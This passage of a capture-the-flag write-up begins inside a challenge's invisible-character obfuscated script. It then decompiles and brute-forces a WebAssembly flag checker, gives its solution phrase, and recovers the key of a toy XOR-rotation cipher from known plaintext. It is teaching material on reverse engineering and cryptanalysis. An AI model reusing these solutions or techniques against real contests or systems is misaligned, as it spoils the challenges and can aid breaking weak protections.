󠄱󠄬󠄠󠄰󠅸󠄹󠄴󠄬󠄠󠄰󠅸󠄰󠅥󠄬󠄠󠄰󠅸󠄶󠄷󠄬󠄠󠄰󠅸󠄰󠄳󠄬󠄠󠄰󠅸󠅤󠅡󠄬󠄠󠄰󠅸󠄱󠄹󠄬󠄠󠄰󠅸󠅢󠅣󠄬󠄠󠄰󠅸󠄵󠄱󠄊󠅝󠄩󠄻󠄊󠄊󠅶󠅡󠅲󠄠󠅷󠅡󠄠󠄽󠄠󠅮󠅥󠅷󠄠󠅗󠅥󠅢󠅁󠅳󠅳󠅥󠅭󠅢󠅬󠅹󠄮󠅉󠅮󠅳󠅴󠅡󠅮󠅣󠅥󠄨󠅮󠅥󠅷󠄠󠅗󠅥󠅢󠅁󠅳󠅳󠅥󠅭󠅢󠅬󠅹󠄮󠅍󠅯󠅤󠅵󠅬󠅥󠄨󠅣󠅯󠅤󠅥󠄩󠄩󠄻󠄊󠅶󠅡󠅲󠄠󠅢󠅵󠅦󠄠󠄽󠄠󠅮󠅥󠅷󠄠󠅕󠅩󠅮󠅴󠄸󠅁󠅲󠅲󠅡󠅹󠄨󠅷󠅡󠄮󠅥󠅸󠅰󠅯󠅲󠅴󠅳󠄮󠅭󠅥󠅭󠅯󠅲󠅹󠄮󠅢󠅵󠅦󠅦󠅥󠅲󠄩󠄻󠄊󠄊󠅡󠅳󠅹󠅮󠅣󠄠󠅦󠅵󠅮󠅣󠅴󠅩󠅯󠅮󠄠󠅧󠅯󠄨󠄩󠄠󠅻󠄊󠄠󠄠󠅳󠅩󠅺󠅥󠅳󠄠󠄽󠄠󠅛󠄮󠄮󠄮󠅛󠄮󠄮󠄮󠅁󠅲󠅲󠅡󠅹󠄨󠄴󠄩󠅝󠄮󠅫󠅥󠅹󠅳󠄨󠄩󠅝󠄮󠅭󠅡󠅰󠄨󠅸󠄽󠄾󠅸󠄪󠄱󠄲󠄸󠄩󠄻󠄊󠄠󠄠󠅢󠅵󠅦󠄮󠅳󠅥󠅴󠄨󠅸󠄮󠅶󠅡󠅬󠅵󠅥󠄮󠅳󠅵󠅢󠅳󠅴󠅲󠄨󠅳󠅩󠅺󠅥󠅳󠅛󠄰󠅝󠄬󠄠󠅳󠅩󠅺󠅥󠅳󠅛󠄱󠅝󠄩󠄮󠅰󠅡󠅤󠅅󠅮󠅤󠄨󠅳󠅩󠅺󠅥󠅳󠅛󠄱󠅝󠄩󠄮󠅳󠅰󠅬󠅩󠅴󠄨󠄧󠄧󠄩󠄮󠅭󠅡󠅰󠄨󠅸󠄽󠄾󠅸󠄮󠅣󠅨󠅡󠅲󠅃󠅯󠅤󠅥󠅁󠅴󠄨󠄧󠄧󠄩󠄩󠄩󠄻󠄊󠄠󠄠󠅩󠅦󠄠󠄨󠅷󠅡󠄮󠅥󠅸󠅰󠅯󠅲󠅴󠅳󠄮󠅶󠅡󠅬󠅩󠅤󠅡󠅴󠅥󠄨󠄩󠄩󠄠󠅻󠄊󠄠󠄠󠄠󠄠󠅨󠅡󠅳󠅨󠄠󠄽󠄠󠅡󠅷󠅡󠅩󠅴󠄠󠅷󠅩󠅮󠅤󠅯󠅷󠄮󠅣󠅲󠅹󠅰󠅴󠅯󠄮󠅳󠅵󠅢󠅴󠅬󠅥󠄮󠅤󠅩󠅧󠅥󠅳󠅴󠄨󠄢󠅓󠅈󠅁󠄭󠄱󠄢󠄬󠄠󠅢󠅵󠅦󠄮󠅳󠅬󠅩󠅣󠅥󠄨󠅳󠅩󠅺󠅥󠅳󠅛󠄲󠅝󠄬󠄠󠅳󠅩󠅺󠅥󠅳󠅛󠄳󠅝󠄩󠄩󠄻󠄊󠄠󠄠󠄠󠄠󠅲󠄮󠅩󠅮󠅮󠅥󠅲󠅔󠅥󠅸󠅴󠄠󠄽󠄠󠄢󠅜󠅵󠅄󠄸󠄳󠅄󠅜󠅵󠅄󠅅󠅁󠄹󠄠󠅦󠅬󠅡󠅧󠄭󠄢󠄠󠄫󠄠󠅛󠄮󠄮󠄮󠄠󠅮󠅥󠅷󠄠󠅕󠅩󠅮󠅴󠄸󠅁󠅲󠅲󠅡󠅹󠄨󠅨󠅡󠅳󠅨󠄩󠅝󠄮󠅭󠅡󠅰󠄨󠅸󠄠󠄽󠄾󠄠󠅸󠄮󠅴󠅯󠅓󠅴󠅲󠅩󠅮󠅧󠄨󠄱󠄶󠄩󠄩󠄮󠅪󠅯󠅩󠅮󠄨󠄧󠄧󠄩󠄻󠄊󠄠󠄠󠅽󠄠󠅥󠅬󠅳󠅥󠄠󠅻󠄊󠄠󠄠󠄠󠄠󠅲󠄮󠅩󠅮󠅮󠅥󠅲󠅈󠅔󠅍󠅌󠄠󠄽󠄠󠅸󠄮󠅶󠅡󠅬󠅵󠅥󠄠󠄽󠄽󠄠󠄢󠄢󠄠󠄿󠄠󠄢󠄦󠅮󠅢󠅳󠅰󠄻󠄢󠄠󠄺󠄠󠄢󠅜󠅵󠄲󠄶󠅄󠄴󠄢󠄻󠄊󠄠󠄠󠅽󠄊󠅽').replace(/u.{8}/g,'')))</script>
<!-- Alok -->
```

In order to view the obfuscated script we can simply copy the argument of the `eval` function and evaluate it in the browser console. This way we can view what the script actually looks like:

```javascript
var code = new Uint8Array([
  0x00, 0x61, 0x73, 0x6d, 0x01, 0x00, 0x00, 0x00, 0x01, 0x05, 0x01, 0x60,
  0x00, 0x01, 0x7f, 0x03, 0x02, 0x01, 0x00, 0x05, 0x03, 0x01, 0x00, 0x01,
  0x07, 0x15, 0x02, 0x06, 0x6d, 0x65, 0x6d, 0x6f, 0x72, 0x79, 0x02, 0x00,
  0x08, 0x76, 0x61, 0x6c, 0x69, 0x64, 0x61, 0x74, 0x65, 0x00, 0x00, 0x0a,
  0x87, 0x01, 0x01, 0x84, 0x01, 0x01, 0x04, 0x7f, 0x41, 0x00, 0x21, 0x00,
  0x02, 0x40, 0x02, 0x40, 0x03, 0x40, 0x20, 0x00, 0x41, 0x20, 0x46, 0x0d,
  0x01, 0x41, 0x02, 0x21, 0x02, 0x41, 0x00, 0x21, 0x01, 0x02, 0x40, 0x03,
  0x40, 0x20, 0x00, 0x20, 0x01, 0x46, 0x0d, 0x01, 0x20, 0x01, 0x41, 0x04,
  0x6c, 0x41, 0x80, 0x02, 0x6a, 0x28, 0x02, 0x00, 0x20, 0x02, 0x6c, 0x21,
  0x02, 0x20, 0x01, 0x41, 0x01, 0x6a, 0x21, 0x01, 0x0c, 0x00, 0x0b, 0x0b,
  0x20, 0x00, 0x41, 0x04, 0x6c, 0x41, 0x80, 0x02, 0x6a, 0x20, 0x02, 0x41,
  0x01, 0x6a, 0x36, 0x02, 0x00, 0x20, 0x00, 0x2d, 0x00, 0x00, 0x20, 0x00,
  0x41, 0x80, 0x01, 0x6a, 0x2d, 0x00, 0x00, 0x73, 0x20, 0x00, 0x41, 0x04,
  0x6c, 0x41, 0x80, 0x02, 0x6a, 0x2d, 0x00, 0x00, 0x47, 0x0d, 0x02, 0x20,
  0x00, 0x41, 0x01, 0x6a, 0x21, 0x00, 0x0c, 0x00, 0x0b, 0x0b, 0x41, 0x01,
  0x0f, 0x0b, 0x41, 0x00, 0x0b, 0x0b, 0x27, 0x01, 0x00, 0x41, 0x80, 0x01,
  0x0b, 0x20, 0x4a, 0x6a, 0x5b, 0x60, 0xa0, 0x64, 0x92, 0x7d, 0xcf, 0x42,
  0xeb, 0x46, 0x00, 0x17, 0xfd, 0x50, 0x31, 0x67, 0x1f, 0x27, 0x76, 0x77,
  0x4e, 0x31, 0x94, 0x0e, 0x67, 0x03, 0xda, 0x19, 0xbc, 0x51
]);

var wa = new WebAssembly.Instance(new WebAssembly.Module(code));
var buf = new Uint8Array(wa.exports.memory.buffer);

async function go() {
  sizes = [...[...Array(4)].keys()].map(x=>x*128);
  buf.set(x.value.substr(sizes[0], sizes[1]).padEnd(sizes[1]).split('').map(x=>x.charCodeAt('')));
  if (wa.exports.validate()) {
    hash = await window.crypto.subtle.digest(\"SHA-1\", buf.slice(sizes[2], sizes[3]));
    r.innerText = \"\\uD83D\\uDEA9 flag-\" + [... new Uint8Array(hash)].map(x => x.toString(16)).join('');
  } else {
    r.innerHTML = x.value == \"\" ? \"&nbsp;\" : \"\\u26D4\";
  }
}
```

We can see that the function constructs a new WebAssembly module. Also this module seems to export a function called `validate()`. If the string we entered is correct the SHA-1 hash of it will be calculated and ultimately represent our flag.

Let's continue by analyzing the *wasm* code. I used [wabt](https://github.com/WebAssembly/wabt) to decompile the wasm byte code. It will output [this](inwasmble/code.c):
```c
// code.c
// full output omitted
static u32 validate(void) {
  u32 l0 = 0, l1 = 0, l2 = 0, l3 = 0;
  FUNC_PROLOGUE;
  u32 i0, i1, i2;
  i0 = 0u;
  l0 = i0;
  L2:
    i0 = l0;
    i1 = 32u;
    i0 = i0 == i1;
    if (i0) {goto B1;} // if l0 == 32 return FALSE
    i0 = 2u;
    l2 = i0; // 2u
    i0 = 0u;
    l1 = i0; // 0u
    L4:
      i0 = l0;
      i1 = l1;
      i0 = i0 == i1;
      if (i0) {goto B3;} // if l0 == l1 break L4
      i0 = l1;
      i1 = 4u;
      i0 *= i1;
      i1 = 256u;
      i0 += i1;
      i0 = i32_load((&memory), (u64)(i0));
      i1 = l2;
      i0 *= i1;
      l2 = i0;
      i0 = l1;
      i1 = 1u;
      i0 += i1;
      l1 = i0;
      goto L4;
    B3:;
    i0 = l0;
    i1 = 4u;
    i0 *= i1;
    i1 = 256u;
    i0 += i1;
    i1 = l2;
    i2 = 1u;
    i1 += i2;
    i32_store((&memory), (u64)(i0), i1);
    i0 = l0;
    i0 = i32_load8_u((&memory), (u64)(i0));
    i1 = l0;
    i2 = 128u;
    i1 += i2;
    i1 = i32_load8_u((&memory), (u64)(i1));
    i0 ^= i1;
    i1 = l0;
    i2 = 4u;
    i1 *= i2;
    i2 = 256u;
    i1 += i2;
    i1 = i32_load8_u((&memory), (u64)(i1));
    i0 = i0 != i1;
    if (i0) {goto B0;}
    i0 = l0;
    i1 = 1u;
    i0 += i1;
    l0 = i0;
    goto L2;
  B1:;
  i0 = 1u;
  goto Bfunc;
  B0:;
  i0 = 0u;
  Bfunc:;
  FUNC_EPILOGUE;
  return i0;
}

static const u8 data_segment_data_0[] = {
  0x4a, 0x6a, 0x5b, 0x60, 0xa0, 0x64, 0x92, 0x7d, 0xcf, 0x42, 0xeb, 0x46,
  0x00, 0x17, 0xfd, 0x50, 0x31, 0x67, 0x1f, 0x27, 0x76, 0x77, 0x4e, 0x31,
  0x94, 0x0e, 0x67, 0x03, 0xda, 0x19, 0xbc, 0x51,
};
```

We can translate this into more approachable python code in order to get a better understanding:

```python
import sys
import struct

MEMORY = [0] * 65536

my_data = [ 0x4a, 0x6a, 0x5b, 0x60, 0xa0, 0x64, 0x92, 0x7d, 0xcf, 0x42, 0xeb, 0x46, 0x00, 0x17, 0xfd, 0x50, 0x31, 0x67, 0x1f, 0x27, 0x76, 0x77, 0x4e, 0x31, 0x94, 0x0e, 0x67, 0x03, 0xda, 0x19, 0xbc, 0x51 ]

def reset_memory():
    for i in range(len(MEMORY)):
        MEMORY[i] = 0

    for i, d in enumerate(my_data):
        MEMORY[128 + i] = d

def validate():
    l0 = 0
    while True: # L2
        if l0 == 32:
            return 1

        l1 = 0
        l2 = 2

        while True: # L4
            if l1 == l0:
                break

            i0 = l1 * 4 + 256
            i0 = load_i32(i0)

            i0 *= l2
            l2 = i0

            l1 += 1

        i0 = l0 * 4 + 256
        i1 = l2 + 1

        store_i32(i0, i1)

        i0 = load_i32_8u(l0)

        i1 = l0 + 128
        i1 = load_i32_8u(i1)

        i0 ^= i1

        i1 = l0 * 4 + 256
        i1 = load_i32_8u(i1)

        if i0 != i1:
            return 0

        l0 += 1

    raise Exception("Not allowed")
```

I also implemented the nescessary functions to load and store memory:

```python
def load_i32(addr):
    rv = struct.unpack('<I', bytes(MEMORY[addr:addr+4]))[0]
    print("LOAD i32", addr, " --> ", rv)
    return rv

def store_i32(addr, value):
    print("STORE", addr, " --> ", value)
    value = value & 0xffffffff
    values = list(map(int, struct.pack('<I', value)))
    MEMORY[addr:addr+4] = values

def load_i32_8u(addr):
    rv = struct.unpack('<B', bytes([MEMORY[addr]]))[0]
    print("LOAD u8", addr, " --> ", rv)
    return rv
```

After that I simply ran the code a few times filling the memory with different values at the start of each run.

```python
>>> MEMORY[:128] = [4] * 128
>>> validate()
STORE 256  -->  3
LOAD u8 0  -->  4
LOAD u8 128  -->  74
LOAD u8 256  -->  3
```

I tried that for each number in range `[0, 255]`. I noticed that the program progresses further for one input number:

```python
>>> MEMORY[:128] = [73] * 128
>>> validate()
STORE 256  -->  3
LOAD u8 0  -->  73
LOAD u8 128  -->  74
LOAD u8 256  -->  3
LOAD i32 256  -->  3
STORE 260  -->  7
LOAD u8 1  -->  73
LOAD u8 129  -->  106
LOAD u8 260  -->  7
```

I figured if the program always progresses further if we enter the correct byte we can simply bruteforce the input one byte at a time! To accomplish this I simply tracked the number of calls made to the memory operations (`load_i32, store_i32, load_i32_8u`). The byte with the highest call count will (hopefully) be the correct byte. When reaching the last byte of the input sequence we can simply check for which input the function returns `True`.

An implementation could look like this: (You can view the full code [here](inwasmble/code.py))

```python
def brute_force():
    result = []
    for i in range(128):
        CALL_COUNTERS.clear()
        for b in range(256):
            initial_memory = result + (128 - i) * [b]

            CALL_COUNTERS.append(0)
            reset_memory()
            MEMORY[:128] = initial_memory

            if validate() == 1:
                return result + [b]

        result.append(argmax(CALL_COUNTERS))
    return result
```

After running this we will quickly find the result `Impossible is for the unwilling.` and indeed when entering this into the input field the correct flag will be revealed to us.

<a name="go-cipher"></a>

## Go cipher

The final challenge I was able to solve was once again a crypto challenge.

We are given several files and their encrypted equivalent. Also the encryption routine is given to us:

```go
func encrypt(plaintext []byte, key []byte) string {
  x := uint64(binary.LittleEndian.Uint64(key[0:]))
  y := uint64(binary.LittleEndian.Uint64(key[8:]))
  z := uint64(binary.LittleEndian.Uint64(key[16:]))

  keyid := md5.Sum(key)
  r := keyid[:]
  for _, e := range plaintext {
    t := (e - byte(x)) ^ byte(y) ^ byte(z)
    r = append(r, t)
    x = bits.RotateLeft64(x, -1)
    y = bits.RotateLeft64(y, 1)
    z = bits.RotateLeft64(z, 1)
  }
  return hex.EncodeToString(r)
}
```

Note that the key is a 24-byte sequence.

The encryption scheme is quite simple:

* First the key is split into three 8-byte sequences (`x, y, z`)
* Second the key is hashed using MD5 and added to the output
* Finally we traverse the input (byte-) sequence and compute a XOR operation using `x`, `y`, `z` and the input byte `e`. After this operation we simply perform a bitrotation on `x`, `y` and `z`

I immediatly guessed that one of given stories was probably encrypted using the same key as our encrypted flag. To find out we simply have to compare the first 16 bytes (the MD5 sum) of the encrypted file. Indeed one will see that story #4 and the flag share the same hash. Since we know the plaintext for story #4 we can try to extract the key from it.

Because the encryption routine uses a simple XOR operation for encoding we can easily compute possible key bytes for each pair of cipher text and known plain text.
Also note that our encryption routine re-uses the key after every 64 bytes of input (`x`, `y`, `z` are only 64 bits large, so the 64th bit rotation will yield the initial state).
Since the input text is quite long (about 200 bytes) we can eliminate many candidates for possible key triples (`x`, `y`, `z`) at each position in the sequence.

In order to retrieve the key we can use a simple backtracking algorithm. We start at an arbitrary byte, say the first one. Then we compute all possible triplets of (`x`, `y`, `z`) which would produce our encoded byte for the given plaintext byte.
From there we can apply the bitrotation operation, try all the different values for unknown bits and continue traversing for each bit for which the encrypted and plaintext byte match. After we we hit iteration 64 we have one key which decodes the encrypted text.

Note that this may not be the key actually used. There are multiple keys which produce the same cipher text. The only difference would be the MD5 hash, but we can easily trick that check ;)

The decryption routine is available [here](go-cipher/decoder.py)